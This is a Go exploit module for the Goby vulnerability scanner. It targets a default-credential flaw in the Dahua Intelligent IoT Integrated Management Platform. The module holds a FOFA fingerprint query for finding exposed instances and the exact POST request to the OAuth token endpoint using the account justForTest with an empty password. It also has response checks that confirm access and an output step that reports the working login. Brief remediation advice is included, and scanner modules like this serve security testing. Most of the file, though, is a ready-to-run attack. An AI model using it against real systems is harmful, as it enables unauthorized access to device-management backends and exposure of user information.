package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dahua Intelligent IoT Integrated Management Platform /evo-apigw/evo-oauth/1.0.0/oauth/public-key Weak Password Vulnerability",
    "Description": "<p>Dahua Intelligent IoT Integrated Management Platform is a comprehensive business management platform software based on intelligent IoT.</p><p>Dahua Intelligent IoT Integrated Management Platform has a weak password vulnerability, allowing attackers to use the weak password JustForTest/JustForTest to log in to the system backend and obtain all user information</p>",
    "Product": "Dahua Intelligent IoT Integrated Management Platform",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2024-04-15",
    "PostTime": "2024-04-24",
    "Author": "兰公子",
    "FofaQuery": "body=\"static/qwebchannel.js\" && body=\"/*客户端会小于800*/\"",
    "GobyQuery": "body=\"static/qwebchannel.js\" && body=\"/*客户端会小于800*/\"",
    "Level": "2",
    "Impact": "<p>Dahua Intelligent IoT Integrated Management Platform has a weak password vulnerability, allowing attackers to use the weak password JustForTest/JustForTest to log in to the system backend and obtain all user information</p>",
    "Recommendation": "<p>Change the default password, which should preferably include uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>If not necessary, public network access to the system is prohibited.</p><p>Set access policies and whitelist access through security devices such as firewalls</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/evo-apigw//evo-oauth/oauth/token",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=justForTest&password=&grant_type=password&client_id=web_client&client_secret=web_client&public_key="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"errMsg\":\"\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{scheme}}}://justForTest:justForTest:{{{hostinfo}}}/evo-apigw/evo-oauth/1.0.0/oauth/public-key?username=justForTest"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/evo-apigw//evo-oauth/oauth/token",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=justForTest&password=&grant_type=password&client_id=web_client&client_secret=web_client&public_key="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"errMsg\":\"\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|variable|use \"justForTest/justForTest\" to login the system"
            ]
        }
    ],
    "Tags": [
        "Default Password",
        "HW-2023"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "4.4",
    "Translation": {
        "CN": {
            "Name": "大华-智能物联综合管理平台 /evo-apigw/evo-oauth/1.0.0/oauth/public-key 默认口令漏洞",
            "Product": "大华-智能物联综合管理平台",
            "Description": "<p>大华-智能物联综合管理平台是一套基于智能物联的综合业务管理平台软件。</p><p>大华-智能物联综合管理平台存在默认口令漏洞，攻击者可利用弱口令justForTest/justForTest登录系统后台，获取所有用户信息<br><br></p>",
            "Recommendation": "<p>修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>如非必要，禁止公网访问该系统。</p><p>通过防火墙等安全设备设置访问策略，设置白名单访问</p>",
            "Impact": "<p>大华-智能物联综合管理平台存在默认口令漏洞，攻击者可利用弱口令justForTest/justForTest登录系统后台，获取所有用户信息<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Dahua Intelligent IoT Integrated Management Platform /evo-apigw/evo-oauth/1.0.0/oauth/public-key Weak Password Vulnerability",
            "Product": "Dahua Intelligent IoT Integrated Management Platform",
            "Description": "<p>Dahua Intelligent IoT Integrated Management Platform is a comprehensive business management platform software based on intelligent IoT.<br></p><p>Dahua Intelligent IoT Integrated Management Platform has a weak password vulnerability, allowing attackers to use the weak password JustForTest/JustForTest to log in to the system backend and obtain all user information<br></p>",
            "Recommendation": "<p>Change the default password, which should preferably include uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>If not necessary, public network access to the system is prohibited.</p><p>Set access policies and whitelist access through security devices such as firewalls</p>",
            "Impact": "<p>Dahua Intelligent IoT Integrated Management Platform has a weak password vulnerability, allowing attackers to use the weak password JustForTest/JustForTest to log in to the system backend and obtain all user information<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
